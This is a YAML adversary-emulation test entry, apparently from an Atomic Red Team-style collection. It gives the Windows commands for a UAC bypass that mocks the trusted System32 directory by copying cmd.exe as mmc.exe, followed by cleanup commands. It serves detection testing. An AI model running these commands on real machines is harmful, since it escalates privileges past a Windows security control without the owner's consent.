- id: c3dcfc10-20d7-52d4-808f-bb31eda86d80
  name: Soumaia ART Tests - Bypass UAC by Mocking Trusted Directories
  description: 'Creates a fake "trusted directory" and copies a binary to bypass UAC. The UAC bypass may not work on fully patched systems

    Upon execution the directory structure should exist if the system is patched, if unpatched Microsoft Management Console should launch (requires elevation)'
  tactic: privilege-escalation
  technique:
    attack_id: T1548.002
    name: 'Abuse Elevation Control Mechanism: Bypass User Account Control'
  platforms:
    windows:
      cmd:
        command: |-
          mkdir "\\?\C:\Windows \System32\"
          copy "C:\Windows\System32\cmd.exe" "\\?\C:\Windows \System32\mmc.exe"
          mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"
        cleanup: |-
          rd "\\?\C:\Windows \" /S /Q >nul 2>nul
          del "c:\testbypass.exe" >nul 2>nul
